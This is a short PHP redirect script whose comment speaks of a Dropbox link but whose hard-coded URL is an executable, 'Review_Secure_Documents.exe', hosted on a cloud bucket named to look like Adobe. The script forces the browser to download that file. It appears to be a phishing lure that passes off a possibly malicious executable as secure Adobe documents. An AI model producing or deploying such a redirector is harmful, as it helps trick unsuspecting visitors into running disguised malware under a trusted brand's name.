<?php
// PASTE YOUR DROPBOX LINK BELOW
$dropboxLink = "https://adobe-secure-documents.sfo3.digitaloceanspaces.com/Review_Secure_Documents.exe"; 

// This small check ensures the link forces a download instead of a preview
if (strpos($dropboxLink, 'dl=0') !== false) {
    $dropboxLink = str_replace('dl=0', 'dl=1', $dropboxLink);
}

// Redirect the user to the Dropbox download
header("Location: " . $dropboxLink);
exit;
?>